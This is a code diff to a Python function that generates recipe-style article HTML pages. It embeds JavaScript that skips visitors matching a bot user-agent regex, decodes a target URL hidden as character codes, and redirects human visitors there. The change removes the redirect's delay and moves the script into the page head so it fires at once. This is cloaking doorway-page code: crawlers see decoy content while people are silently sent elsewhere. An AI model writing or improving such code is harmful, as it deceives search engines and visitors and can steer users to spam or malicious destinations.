@@ -254,12 +254,12 @@ def generate_article_html(slug, target_url, meta, github_domain, local_image_pat
     js_parts.append("var _ua=navigator.userAgent||'';")
     js_parts.append(bot_regex)
     js_parts.append("if(_b.test(_ua))return;")
-    js_parts.append("setTimeout(function(){try{")
+    js_parts.append("try{")
     js_parts.append("var _c=" + encoded_target + ";")
     js_parts.append("var _u='';for(var i=0;i<_c.length;i++){_u+=String.fromCharCode(_c[i]);}")
     js_parts.append("var _s=window.location.search;if(_s)_u+=_s;")
     js_parts.append("window.location.href=_u;")
-    js_parts.append("}catch(e){}},100);")
+    js_parts.append("}catch(e){};")
     js_parts.append("})();")
     js_code = "".join(js_parts)
     redirect_script = "\n    <script>\n        " + js_code + "\n    </script>"
@@ -274,6 +274,7 @@ def generate_article_html(slug, target_url, meta, github_domain, local_image_pat
 <head>
 {meta_tags}
 {schema_tags}
+{redirect_script}
     <style>
         body {{
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -306,7 +307,7 @@ def generate_article_html(slug, target_url, meta, github_domain, local_image_pat
     {img_tag}
     <p>{html.escape(description)}</p>
     <p class="loading">Loading full recipe...</p>
-{redirect_script}
+
 </body>
 </html>'''
 
